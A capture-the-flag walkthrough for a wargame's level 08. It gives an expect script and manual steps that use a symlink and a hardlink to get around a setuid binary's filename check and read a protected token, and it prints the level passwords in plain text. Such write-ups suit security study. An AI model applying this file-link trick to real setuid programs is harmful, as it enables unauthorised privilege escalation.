# Level 08
- In the shell of your choice run the script attached or follow the steps bellow using your VM IP address to get the flag, also root privileges and some dependencies may be needed to install before
	```sh
	$ chmod u+x script.sh
	$ ./script.sh
	$ cat script.sh
	#!/usr/bin/expect -f
	set ip 192.168.1.103
	spawn ssh -o "StrictHostKeyChecking no" level08@$ip -p 4242 "mkdir -p /tmp/level08 ; cd /tmp/level08 ; chmod 777 . ; rm -rf ./* ; ln -s ~/token token ; ln token hardlink ; ~/level08 hardlink"
	expect "sword:"
	send "fiumuikeil55xe9cu4dood66h\r"
	expect -re "\r\n(.*?)\r\n"
	set password $expect_out(1,string)
	spawn ssh -o "StrictHostKeyChecking no" flag08@$ip -p 4242 "getflag"
	expect "sword:"
	send "$password\r"
	interact
	```
- List content of the home directory
	```sh
	$ ls -l
	```
- Run the file `level08`
	```sh
	$ ./level08
	```
- Use `ltrace` utility to trace the libraries calls
	```sh
	$ ltrace ./level08 token
	```
- Make a directory in `/tmp` location
	```sh
	$ mkdir -p /tmp/level08
	$ chmod 777 /tmp/level08
	$ rm -rf /tmp/level08/*
	```
- Create a symlink in that directory to the `token` file seen earlier
	```sh
	$ ln -s token /tmp/level08/token
	```
- Create a hardlink in that directory to the newely created symlink
	```sh
	$ ln /tmp/level08/token /tmp/level08/hardlink
	```
- Run the file `level08` with an argument of previously created hardlink
	```sh
	$ ./level08 /tmp/level08/hardlink
	```
- Switch to the user `flag08` with the given token `quif5eloekouj29ke0vouxean`
	```sh
	$ su flag08
	Password: quif5eloekouj29ke0vouxean
	```
- Run `getflag` command to get the flag
	```sh
	$ getflag
	``` 
- With the token provided `25749xKZ8L7DkSCwJkT9dyv6f` switch to the next user level
	```sh
	$ su level09
	Password: 25749xKZ8L7DkSCwJkT9dyv6f
	```
